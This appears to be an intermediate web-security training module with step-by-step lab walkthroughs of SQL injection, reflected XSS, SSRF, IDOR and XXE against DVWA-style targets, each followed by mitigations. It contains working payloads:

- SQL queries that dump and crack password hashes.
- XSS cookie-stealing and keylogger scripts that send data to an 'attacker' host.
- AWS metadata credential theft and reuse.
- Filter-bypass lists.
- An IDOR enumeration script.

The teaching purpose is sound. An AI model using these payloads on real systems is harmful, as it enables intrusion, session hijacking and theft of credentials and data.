---
title: "Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR"
area: "Web"
order: 10.5
level: "intermediate"
summary: "Four real attacks executed step-by-step with complete request/response pairs, every character explained. All in a legal local environment. From 'I understand the words' to 'I understand with my hands on the keys'."
prereq:
  - "Section 04, 10"
tools:
  - "Burp Suite Community or curl + jq"
  - "DVWA / Juice Shop / WebGoat in Docker"
  - "Browser DevTools"
---

# Byte-by-byte walkthrough

> Every example in this section is runnable on your Docker lab (DVWA / Juice Shop). Run every request, read every byte. No "trust the tool".

## Quick setup

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
# Open http://localhost  user: admin  pass: password
# Setup database (click "Create / Reset Database")
# DVWA Security: Low (to start)
```

## 1. SQL Injection — the first, the archetype

### The vulnerable page

URL: `http://localhost/vulnerabilities/sqli/`

Form: "User ID" field, submit. Below, there's code (in "view source" mode):

```php
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

**Obvious vulnerability**: `$id` concatenated directly into SQL. No escaping, no prepared statement.

### Step 1 — innocuous input, understand the baseline

HTTP request the browser sends:
```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc...; security=low
```

Response (relevant part):
```html
<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>
```

**Actual query** on the server side:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

Returns 1 row: admin/admin.

### Step 2 — test the injection

What happens if you put `1'`? The query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'';
                                                          ^^ unpaired quote
```

SQL error. Confirms the vulnerability:
```http
GET /vulnerabilities/sqli/?id=1'&Submit=Submit
```

Response:
```
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near ''1''' at line 1
```

**SQL error leaked in the response = injection confirmed + "error-based" feasible.**

### Step 3 — logical bypass (get everything)

Payload: `1' OR '1'='1`. The query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Condition `user_id = '1'` (true for Admin) OR `'1'='1'` (always true) → **WHERE is always true** → returns **all users**.

```http
GET /vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit
```

The space is URL-encoded as `+`. `%20` works too.

Response:
```
ID: 1' OR '1'='1
First name: admin   Surname: admin
First name: Gordon  Surname: Brown
First name: Hack    Surname: Me
First name: Pablo   Surname: Picasso
First name: Bob     Surname: Smith
```

5 users. **Authentication-equivalent bypass.**

### Step 4 — UNION-based to extract arbitrary data

To use `UNION SELECT`, I need to know **how many fields** the original query has. Test with `ORDER BY`:

```
?id=1' ORDER BY 1-- -
?id=1' ORDER BY 2-- -
?id=1' ORDER BY 3-- -
```

The `-- ` comment (with a trailing space!) discards the rest of the original query. The third gives error `Unknown column '3'`. So **2 columns**.

Now UNION to extract the DB version:
```
?id=1' UNION SELECT 1, version()-- -
```

Query:
```sql
SELECT first_name, last_name FROM users WHERE user_id='1' UNION SELECT 1, version()-- -';
```

Response:
```
ID: 1' UNION SELECT 1, version()-- 
First name: admin
Surname: admin
First name: 1
Surname: 10.1.26-MariaDB-0+deb9u1
```

**You have the DB version.** Now you know it's MariaDB 10.1 → docs for specific syntax.

### Step 5 — read `information_schema` (the database map)

In MySQL/MariaDB there's a system table `information_schema.tables` that lists everything.

```
?id=1' UNION SELECT 1, group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()-- -
```

Broken down:
- `UNION SELECT 1, X` → two columns (compatible with the original SELECT).
- `group_concat(table_name SEPARATOR ',')` → concatenates table names into a single string.
- `FROM information_schema.tables` → metadata.
- `WHERE table_schema=database()` → only the current DB.
- `-- ` → comment (closes the rest).

Response (excerpt):
```
Surname: guestbook,users
```

There's the `users` table.

### Step 6 — extract `users` columns

```
?id=1' UNION SELECT 1, group_concat(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
```

Response:
```
Surname: user_id,first_name,last_name,user,password,avatar,...
```

### Step 7 — extract username and password hash

```
?id=1' UNION SELECT user, password FROM users-- -
```

Response:
```
First name: admin       Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb     Surname: e99a18c428cb38d5f260853678922e03
First name: 1337        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo       Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

MD5 hashes! Crack online or offline:
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > h.txt
hashcat -m 0 h.txt rockyou.txt
# → password
```

**Game over.** Username admin / password "password".

### Step 8 — automate with sqlmap

The whole manual step 1-7 is didactic. In production you use `sqlmap`:
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc; security=low" --batch --dbs

sqlmap -u "..." --cookie="..." -D dvwa --tables
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

In ~10 seconds you'd have the hashes. But **if you didn't know the manual, you'd use sqlmap as a black box and you wouldn't understand the bypasses when a WAF gets in the way.**

### Mitigation (correct form)

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

Parameters **separated** from the query → user input cannot alter SQL structure.

## 2. Reflected XSS — code execution in the victim's browser

### Vulnerable page

URL: `http://localhost/vulnerabilities/xss_r/?name=test`

PHP source:
```php
$html = "<pre>Hello " . $_GET['name'] . "</pre>";
echo $html;
```

Input reflected without HTML escaping. Test:

```
?name=<script>alert(1)</script>
```

HTML response:
```html
<pre>Hello <script>alert(1)</script></pre>
```

Browser parses, executes → popup `1`. **XSS confirmed.**

### Step 2 — useful (non-innocuous) payloads

Cookie steal:
```html
<script>fetch('http://attacker/?c='+encodeURIComponent(document.cookie))</script>
```

In URL:
```
?name=%3Cscript%3Efetch('http://attacker/?c='%2BencodeURIComponent(document.cookie))%3C/script%3E
```

**You send this link to the victim.** If they click → their browser fetches attacker passing the cookies. You read them in your access.log and use them for session hijack.

### Step 3 — bypassing a weak filter

If the developer adds a naive filter:
```php
$name = str_replace('<script>', '', $_GET['name']);
```

Bypass:
- Doubled tag: `<scr<script>ipt>alert(1)</script>` → it filters the inner one, the outer remains.
- Case mix: `<ScRiPt>` (PHP html is non-case-sensitive, but some filters are case-sensitive).
- Event handler: `<img src=x onerror=alert(1)>` — no "script" string.
- SVG: `<svg onload=alert(1)>`.
- Body: `<body onpageshow=alert(1)>`.
- Iframe srcdoc: `<iframe srcdoc="<script>alert(1)</script>">`.
- JS protocol: `<a href="javascript:alert(1)">click</a>`.
- DOM clobbering, mutation XSS, ... 

Reference: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Step 4 — more realistic payload (keylogger)

```html
<script>
const k=[]; 
document.addEventListener('keydown', e => {
    k.push(e.key);
    if (k.length > 50) {
        fetch('http://attacker/?l=' + encodeURIComponent(k.join('')));
        k.length = 0;
    }
});
</script>
```

On a page with a login form → you capture the password as it's typed.

### Mitigation (in order of robustness)

1. **Context-aware encoding**: HTML body, attribute, JS string, URL — different encoding for each. Use a safe template engine (Jinja2 autoescape, React JSX).
2. **CSP** strict (no `unsafe-inline`, nonces or hash-based, no `unsafe-eval`).
3. **HttpOnly** cookies (no JS access → no theft via XSS-document.cookie).
4. **User HTML sanitization**: DOMPurify if you really must accept HTML.

## 3. SSRF — the server makes requests that you control

### Didactic setup

Lab: WebGoat or Juice Shop. Endpoint that fetches a URL:
```python
@app.get('/preview')
def preview(url):
    r = requests.get(url, timeout=5)
    return r.text
```

Naive test:
```
GET /preview?url=https://example.com
```

Response: example.com content. ✅ works as intended.

### Step 1 — basic SSRF, scan the internal network

```
?url=http://127.0.0.1:22
```

If the server (containerized or EC2) has SSH locally, you get the banner:
```
SSH-2.0-OpenSSH_8.4p1 Debian...
```

**You have access (via SSRF) to private services.**

Enumerate internal ports:
```bash
for p in 22 80 443 3306 5432 6379 8080 8443 27017; do
    curl -s "http://target/preview?url=http://127.0.0.1:$p" | head -1
done
```

### Step 2 — read AWS metadata (IMDSv1)

On EC2 with IMDSv1 active:
```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Response: `my-app-role`.

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role
```

Response (JSON):
```json
{
  "Code": "Success",
  "LastUpdated": "2026-05-21T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAEXAMPLE...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY...",
  "Token": "FwoGZXIvYXdzEK//...",
  "Expiration": "2026-05-21T16:00:00Z"
}
```

Use with AWS CLI:
```bash
export AWS_ACCESS_KEY_ID=ASIAEXAMPLE...
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7...
export AWS_SESSION_TOKEN=FwoGZXIvYXdz...
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name my-app-role
```

From here exfil buckets, lambda, etc. **Catastrophic.**

### Step 3 — bypass weak filters

The server tries to filter loopback:
```python
if 'localhost' in url or '127.0.0.1' in url:
    return "blocked"
```

Bypass:
- `http://127.1` (valid short form).
- `http://0.0.0.0`.
- `http://[::1]/` (IPv6 loopback).
- `http://2130706433/` (127.0.0.1 in decimal).
- `http://0x7f000001/` (hex).
- `http://017700000001/` (octal).
- `http://127.0.0.1.nip.io/` (DNS service that resolves to 127.0.0.1).
- DNS rebinding: a domain that resolves first to an innocuous IP, then (after the check) to 127.0.0.1.

### Step 4 — protocol smuggling

If the HTTP library supports multiple schemes:
- `file:///etc/passwd` — LFI via SSRF.
- `gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A` — exploit unauthenticated Redis via SSRF (RESP command corruption).
- `dict://`, `ldap://`.

### Mitigation

- **Whitelist** of allowed domains.
- Resolve DNS server-side, check the resulting IP against RFC1918/loopback/link-local, **reject**, then connect with the fixed IP.
- Network: nginx/HAProxy in front, block 169.254.0.0/16.
- **IMDSv2** (requires PUT + token).
- Disable dangerous schemes (`gopher`, `file`, `dict`).

## 4. IDOR — the most boring and most prevalent bug

### Lab

A toy webapp with `/api/orders/{id}` that returns the order if it belongs to the logged-in user. Spoiler: the authorization check is missing.

### Step 1 — figure out the pattern

Log in as Alice. Go to your orders. URL:
```
GET /api/orders/1042  →  {"id":1042,"user":"alice","items":[...]}
GET /api/orders/1043  →  {"id":1043,"user":"alice","items":[...]}
```

### Step 2 — increment

```
GET /api/orders/1041  →  {"id":1041,"user":"bob","items":[...]}
GET /api/orders/1040  →  {"id":1040,"user":"alice","items":[...]}
```

**You see Bob's orders.** No authorization check on the object.

### Step 3 — automate enumeration

```python
import requests
s = requests.Session()
s.post("https://target/login", json={"user":"alice","pass":"..."})

leaked = []
for i in range(1, 10000):
    r = s.get(f"https://target/api/orders/{i}")
    if r.status_code == 200:
        data = r.json()
        if data['user'] != 'alice':
            leaked.append(data)

print(f"Leaked {len(leaked)} orders of other users")
```

In 10 minutes **10k records of privacy violation**.

### Step 4 — variants

- **BFLA** (Broken Function Level Authz): a normal user calls an admin endpoint. `GET /api/admin/users` → instead of 403 it works.
- **Parameter pollution**: `?user_id=alice&user_id=bob` (the second one is used).
- **Mass assignment**: PATCH an order with a `user_id` field → you gift yourself someone else's order.
- **Guessable GUID**: GUID v1 contains MAC + timestamp → guessable.

### Mitigation

```python
@app.get('/api/orders/<int:id>')
@login_required
def get_order(id):
    order = Order.query.get_or_404(id)
    if order.user_id != current_user.id and not current_user.is_admin:
        abort(403)
    return order.to_json()
```

**Always-on per-object authorization check**. Pattern: gateway/middleware that enforces policy → no "I forgot".

## 5. Bonus — XXE in 10 seconds

A server that parses XML:
```xml
<?xml version="1.0"?>
<user><name>Alice</name></user>
```

Add an external DTD:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<user><name>&x;</name></user>
```

If the parser is permissive → `<name>` expands `&x;` with the contents of `/etc/passwd`. **LFI via XML.**

Mitigation: `defusedxml` in Python or disable DTDs in the parser.

## Key concepts

1. **SQLi**: understand the internal query, manipulate the syntax, read the error → leak. Mitigation: prepared statements.
2. **XSS**: input in the HTML/JS context, executes in the victim's browser. Mitigation: context-aware encoding + CSP + HttpOnly.
3. **SSRF**: server fetches your URL, you have access to internal services + cloud metadata. Mitigation: whitelist + IMDSv2.
4. **IDOR**: no per-object authorization check. Mitigation: always-on authz middleware.

Now when the SIEM gives you an alert "SQL injection attempt", it won't feel abstract anymore — you'll know exactly the sequence of bytes that generated it.
